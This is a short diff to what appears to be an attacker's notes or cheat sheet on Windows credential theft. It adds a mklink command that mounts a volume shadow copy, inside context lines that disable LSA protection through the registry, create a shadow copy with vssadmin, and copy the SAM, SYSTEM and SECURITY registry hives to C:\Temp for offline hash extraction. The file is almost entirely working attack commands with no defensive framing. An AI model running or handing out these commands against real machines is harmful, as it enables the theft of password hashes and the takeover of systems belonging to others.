@@ -21,6 +21,8 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 
 vssadmin list shadows ( List Available Shadows )
 
 vssadmin create shadow /for=C:   -->   \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+cmd /c mklink /d C:\shadow_drive \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Temp\SECURITY
